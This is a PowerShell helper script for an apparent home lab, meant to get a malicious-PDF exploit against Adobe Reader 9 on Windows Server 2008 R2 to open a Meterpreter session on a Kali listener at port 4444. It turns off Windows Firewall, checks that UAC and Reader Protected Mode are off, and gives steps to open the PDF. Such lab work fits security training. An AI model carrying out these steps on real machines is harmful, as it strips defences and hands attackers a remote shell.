# Quick Exploit Troubleshooting for Windows Server 2008 R2
# Compatible with PowerShell 2.0

Write-Host "╔════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║     PDF EXPLOIT TROUBLESHOOTING - Windows 2008 R2              ║" -ForegroundColor Cyan
Write-Host "╚════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""

# 1. Check PDFs exist on Desktop
Write-Host "[1/6] Checking PDF files on Desktop..." -ForegroundColor Yellow
$pdfFiles = Get-ChildItem C:\Users\vagrant\Desktop\*.pdf -ErrorAction SilentlyContinue
if ($pdfFiles) {
    foreach ($pdf in $pdfFiles) {
        $sizeKB = [math]::Round($pdf.Length / 1KB, 2)
        Write-Host "  ✓ $($pdf.Name) (${sizeKB}KB)" -ForegroundColor Green
    }
} else {
    Write-Host "  ✗ No PDF files found on Desktop!" -ForegroundColor Red
    Write-Host "  Copying from shared folder..." -ForegroundColor Yellow
    Copy-Item C:\vagrant\exploits\*.pdf C:\Users\vagrant\Desktop\ -ErrorAction SilentlyContinue
    if ($?) {
        Write-Host "  ✓ PDFs copied successfully" -ForegroundColor Green
    } else {
        Write-Host "  ✗ Failed to copy PDFs" -ForegroundColor Red
    }
}
Write-Host ""

# 2. Check Windows Firewall status
Write-Host "[2/6] Checking Windows Firewall..." -ForegroundColor Yellow
$fwProfiles = netsh advfirewall show allprofiles state | Select-String "State"
foreach ($line in $fwProfiles) {
    if ($line -match "ON") {
        Write-Host "  ✗ Firewall is ON - disabling..." -ForegroundColor Red
        netsh advfirewall set allprofiles state off | Out-Null
        Write-Host "  ✓ Firewall disabled" -ForegroundColor Green
    } else {
        Write-Host "  ✓ Firewall is OFF" -ForegroundColor Green
    }
}
Write-Host ""

# 3. Test network connectivity to Kali
Write-Host "[3/6] Testing connectivity to Kali Linux..." -ForegroundColor Yellow
$kaliIP = "192.168.56.101"

# Ping test
if (Test-Connection $kaliIP -Count 2 -Quiet) {
    Write-Host "  ✓ Can ping Kali at $kaliIP" -ForegroundColor Green
} else {
    Write-Host "  ✗ Cannot ping Kali!" -ForegroundColor Red
    Write-Host "  Make sure Kali VM is running" -ForegroundColor Yellow
}
Write-Host ""

# 4. Test port 4444 connectivity (PowerShell 2.0 compatible)
Write-Host "[4/6] Testing port 4444 connectivity..." -ForegroundColor Yellow
try {
    $tcpClient = New-Object System.Net.Sockets.TcpClient
    $tcpClient.ReceiveTimeout = 3000
    $tcpClient.SendTimeout = 3000
    $tcpClient.Connect($kaliIP, 4444)

    if ($tcpClient.Connected) {
        Write-Host "  ✓ Port 4444 is open (listener is running)" -ForegroundColor Green
        $tcpClient.Close()
    } else {
        Write-Host "  ✗ Port 4444 is closed" -ForegroundColor Red
    }
} catch {
    Write-Host "  ✗ Cannot connect to port 4444" -ForegroundColor Red
    Write-Host "  Make sure Metasploit listener is running on Kali!" -ForegroundColor Yellow
    Write-Host "  On Kali: cd /vagrant/exploits && ./start_attack.sh" -ForegroundColor Cyan
}
Write-Host ""

# 5. Check Adobe Reader installation
Write-Host "[5/6] Checking Adobe Reader..." -ForegroundColor Yellow
$adobePath = "C:\Program Files (x86)\Adobe\Reader 9.0\Reader\AcroRd32.exe"
if (Test-Path $adobePath) {
    $adobeVersion = (Get-Item $adobePath).VersionInfo.FileVersion
    Write-Host "  ✓ Adobe Reader installed: Version $adobeVersion" -ForegroundColor Green

    # Check Adobe Reader security settings
    $protectedMode = Get-ItemProperty "HKCU:\Software\Adobe\Acrobat Reader\9.0\Privileged" -Name bProtectedMode -ErrorAction SilentlyContinue
    if ($protectedMode.bProtectedMode -eq 0) {
        Write-Host "  ✓ Protected Mode: DISABLED" -ForegroundColor Green
    } else {
        Write-Host "  ✗ Protected Mode: ENABLED (may block exploit)" -ForegroundColor Yellow
    }
} else {
    Write-Host "  ✗ Adobe Reader 9.0 not found!" -ForegroundColor Red
}
Write-Host ""

# 6. Check UAC status
Write-Host "[6/6] Checking UAC status..." -ForegroundColor Yellow
$uac = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA
if ($uac.EnableLUA -eq 0) {
    Write-Host "  ✓ UAC is disabled" -ForegroundColor Green
} else {
    Write-Host "  ✗ UAC is enabled (may interfere)" -ForegroundColor Yellow
}
Write-Host ""

# Summary and instructions
Write-Host "╔════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║                    NEXT STEPS                                  ║" -ForegroundColor Cyan
Write-Host "╚════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""

Write-Host "If all checks passed, try the exploit:" -ForegroundColor Yellow
Write-Host ""
Write-Host "1. Make sure listener is running on Kali:" -ForegroundColor Cyan
Write-Host "   vagrant ssh kali" -ForegroundColor White
Write-Host "   cd /vagrant/exploits" -ForegroundColor White
Write-Host "   ./start_attack.sh" -ForegroundColor White
Write-Host ""
Write-Host "2. Open PDF with Adobe Reader (run this on Windows):" -ForegroundColor Cyan
Write-Host "   Start-Process `"C:\Program Files (x86)\Adobe\Reader 9.0\Reader\AcroRd32.exe`" -ArgumentList `"C:\Users\vagrant\Desktop\JOAN-ESPINACH-TRD.pdf`"" -ForegroundColor White
Write-Host ""
Write-Host "3. Watch the Kali terminal - you should see:" -ForegroundColor Cyan
Write-Host "   [*] Sending stage (176198 bytes) to 192.168.56.102" -ForegroundColor Green
Write-Host "   [*] Meterpreter session 1 opened" -ForegroundColor Green
Write-Host ""

# Manual port test if needed
Write-Host "═══════════════════════════════════════════════════════════════" -ForegroundColor Gray
Write-Host "MANUAL TEST: Copy and run this to test port 4444:" -ForegroundColor Gray
Write-Host ""
Write-Host "`$t = New-Object System.Net.Sockets.TcpClient; try { `$t.Connect('192.168.56.101', 4444); Write-Host 'Port 4444 OPEN' -ForegroundColor Green; `$t.Close() } catch { Write-Host 'Port 4444 CLOSED - Start listener on Kali!' -ForegroundColor Red }" -ForegroundColor White
Write-Host ""
